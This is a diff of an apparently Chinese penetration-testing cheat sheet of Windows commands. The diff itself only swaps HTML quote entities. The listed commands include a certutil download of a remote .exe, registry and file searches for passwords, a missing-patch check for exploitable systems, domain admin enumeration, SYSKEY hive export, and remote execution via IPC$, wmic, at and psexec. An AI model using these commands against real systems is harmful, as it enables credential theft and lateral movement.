@@ -109,21 +109,20 @@ https://blog.csdn.net/qq_45174221/article/details/104979705
 http://t3ngyu.leanote.com/post/LM-WinRM-WinRS
 https://blog.csdn.net/qq_20307987/article/details/85087960
 </code></pre></div>
-
 <div class="highlight"><pre><span></span><code>certutil-----从远程url下载文件
 案例:certutil<span class="w"> </span>-urlcache<span class="w">  </span>-split<span class="w">  </span>-f<span class="w"> </span>http://baidu.com/test.exe
 
 findstr-----查找文件后缀结果
-findstr<span class="w"> </span>/s<span class="w"> </span>/i<span class="w"> </span><span class="s2">&quot;pass&quot;</span><span class="w"> </span>*.py*
+findstr<span class="w"> </span>/s<span class="w"> </span>/i<span class="w"> </span><span class="s2">"pass"</span><span class="w"> </span>*.py*
 
 reg<span class="w"> </span>query<span class="w"> </span>HKLM<span class="w"> </span>/f<span class="w"> </span>password<span class="w"> </span>/t<span class="w"> </span>REG_SZ<span class="w"> </span>/s-----搜集注册表中的各种密码数据
 
 查看有没有开启远程链接，运行下面命令：
-REG<span class="w"> </span>QUERY<span class="w"> </span><span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span><span class="w"> </span>/v<span class="w"> </span>fDenyTSConnections
+REG<span class="w"> </span>QUERY<span class="w"> </span><span class="s2">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span><span class="w"> </span>/v<span class="w"> </span>fDenyTSConnections
 结果：1表示关闭，0表示开启
 
 快速查找未打补丁的exp
-systeminfo&gt;bzhack.txt<span class="p">&amp;</span><span class="o">(</span><span class="k">for</span><span class="w"> </span>%i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">(</span><span class="w"> </span>KB977165<span class="w"> </span>KB2160329<span class="w"> </span>KB2503665<span class="w"> </span>KB2592799<span class="w"> </span>KB2707511<span class="w"> </span>KB2829361<span class="w"> </span>KB2850851<span class="w"> </span>KB3000061<span class="w"> </span>KB3045171<span class="w"> </span>KB3077657<span class="w"> </span>KB3079904<span class="w"> </span>KB3134228<span class="w"> </span>KB3143141<span class="w"> </span>KB3141780<span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>@type<span class="w"> </span>bzhack.txt<span class="p">|</span>@find<span class="w"> </span>/i<span class="w"> </span><span class="s2">&quot;%i&quot;</span><span class="o">||</span><span class="w"> </span>@echo<span class="w"> </span>%i<span class="w"> </span>you<span class="w"> </span>can<span class="w"> </span>exp<span class="o">)</span><span class="p">&amp;</span>del<span class="w"> </span>/f<span class="w"> </span>/q<span class="w"> </span>/a<span class="w"> </span>bzhack.txt
+systeminfo&gt;bzhack.txt<span class="p">&amp;</span><span class="o">(</span><span class="k">for</span><span class="w"> </span>%i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">(</span><span class="w"> </span>KB977165<span class="w"> </span>KB2160329<span class="w"> </span>KB2503665<span class="w"> </span>KB2592799<span class="w"> </span>KB2707511<span class="w"> </span>KB2829361<span class="w"> </span>KB2850851<span class="w"> </span>KB3000061<span class="w"> </span>KB3045171<span class="w"> </span>KB3077657<span class="w"> </span>KB3079904<span class="w"> </span>KB3134228<span class="w"> </span>KB3143141<span class="w"> </span>KB3141780<span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>@type<span class="w"> </span>bzhack.txt<span class="p">|</span>@find<span class="w"> </span>/i<span class="w"> </span><span class="s2">"%i"</span><span class="o">||</span><span class="w"> </span>@echo<span class="w"> </span>%i<span class="w"> </span>you<span class="w"> </span>can<span class="w"> </span>exp<span class="o">)</span><span class="p">&amp;</span>del<span class="w"> </span>/f<span class="w"> </span>/q<span class="w"> </span>/a<span class="w"> </span>bzhack.txt
 
 
 
@@ -136,7 +135,7 @@ Xcopy<span class="w">   </span>copy加强版，复制文件夹
 del<span class="w">     </span>删除文件
 ren<span class="w">     </span><span class="o">[</span>原文件/夹名<span class="o">][</span>新文件/夹名<span class="o">]</span>修改文件名
 <span class="nb">type</span><span class="w">    </span>查看文本内容
-dir<span class="w"> </span>/a<span class="w"> </span>/s<span class="w"> </span>/b<span class="w"> </span>d:<span class="se">\&quot;</span>*.conf<span class="s2">&quot;        搜索d盘里conf结尾的文件</span>
+dir<span class="w"> </span>/a<span class="w"> </span>/s<span class="w"> </span>/b<span class="w"> </span>d:<span class="se">\"</span>*.conf<span class="s2">"        搜索d盘里conf结尾的文件</span>
 <span class="s2">edit        文本编辑</span>
 <span class="s2">type        显示文件内容</span>
 
@@ -160,7 +159,7 @@ dir<span class="w"> </span>/a<span class="w"> </span>/s<span class="w"> </span>/
 <span class="s2">net user /domain 查看域内有哪些用户，Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。</span>
 <span class="s2">net user 用户名 /domain 查看账户信息</span>
 <span class="s2">net group /domain 查看域中的组</span>
-<span class="s2">net group &quot;</span>domain<span class="w"> </span>admins<span class="s2">&quot; /domain 查看当前域的管理用户</span>
+<span class="s2">net group "</span>domain<span class="w"> </span>admins<span class="s2">" /domain 查看当前域的管理用户</span>
 <span class="s2">query user 查看当前在线的用户</span>
 <span class="s2">net localgroup 查看所有的本地组</span>
 <span class="s2">net localgroup administrators 查看administrators组中有哪些用户</span>
@@ -186,7 +185,7 @@ dir<span class="w"> </span>/a<span class="w"> </span>/s<span class="w"> </span>/
 <span class="s2">reg save hklm\system system.hive 导出SYSKEY</span>
 <span class="s2">net use \\目标IP\ipc</span>$<span class="s2"> 密码 /u:用户名 连接目标机器</span>
 <span class="s2">at \\目标IP 21:31 c:\server.exe 在某个时间启动某个应用</span>
-<span class="s2">wmic /node:&quot;</span>目标IP<span class="s2">&quot; /password:&quot;</span><span class="m">123456</span><span class="s2">&quot; /user:&quot;</span>admin<span class="s2">&quot; 连接目标机器</span>
+<span class="s2">wmic /node:"</span>目标IP<span class="s2">" /password:"</span><span class="m">123456</span><span class="s2">" /user:"</span>admin<span class="s2">" 连接目标机器</span>
 <span class="s2">psexec.exe \\目标IP -u username -p password -s cmd 在目标机器上执行cmd</span>
 <span class="s2">finger username @host 查看最近有哪些用户登陆</span>
 <span class="s2">route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface</span>
